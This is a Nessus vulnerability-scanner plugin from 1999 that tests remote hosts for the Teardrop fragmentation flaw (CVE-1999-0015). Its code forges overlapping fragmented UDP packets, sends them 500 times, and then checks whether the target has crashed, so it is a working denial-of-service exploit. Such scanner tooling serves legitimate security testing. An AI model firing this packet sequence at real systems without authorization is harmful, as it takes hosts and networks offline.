#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10279);
 script_bugtraq_id(124);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-1999-0015");
 
 name["english"] = "Teardrop";
 name["francais"] = "Teardrop";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to make the remote server crash using the 'teardrop' attack. 

An attacker may use this flaw to shut down this server, thus 
preventing your network from working properly.

Solution : contact your operating system vendor for a patch.
Risk factor : High";


 desc["francais"] = "Il s'est avéré
possible de faire planter la 
machine distante en utilisant
l'attaque 'teardrop'. 

Un pirate peut utiliser cette
attaque pour empecher votre
réseau de fonctionner normallement.

Solution : contactez le vendeur
de votre OS pour un patch.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host using the 'teardrop' attack";
 summary["francais"] = "Plante le serveur distant en utilisant l'attaque 'teardrop'";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#




# Our constants
MAGIC = 2;
IPH   = 20;
UDPH  = 8;
PADDING = 0x1c;
MAGIC = 0x3;
IP_ID = 242;
sport = 123;
dport = 137;

LEN = IPH + UDPH + PADDING;

src = this_host();
ip = forge_ip_packet(ip_v : 4,
		     ip_hl : 5,
		     ip_tos : 0,
		     ip_id  : IP_ID,
		     ip_len : LEN,
		     ip_off : IP_MF,
		     ip_p   : IPPROTO_UDP,
		     ip_src : src,
		     ip_ttl : 0x40);

# Forge the first UDP packet

LEN = UDPH + PADDING;	    
udp1 = forge_udp_packet(ip : ip,
			uh_sport : sport, uh_dport : dport,
			uh_ulen : LEN);		     

# Change some tweaks in the IP packet

LEN = IPH + MAGIC + 1;
ip = set_ip_elements(ip: ip, ip_len : LEN, ip_off : MAGIC);

# and forge the second UDP packet	
LEN = UDPH + PADDING;     
udp2 = 	forge_udp_packet(ip : ip,
			uh_sport : sport, uh_dport : dport,
			uh_ulen : LEN);
			

# Send our UDP packets 500 times

start_denial();
send_packet(udp1,udp2, pcap_active:FALSE) x 500;	
sleep(10);
alive = end_denial();

if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
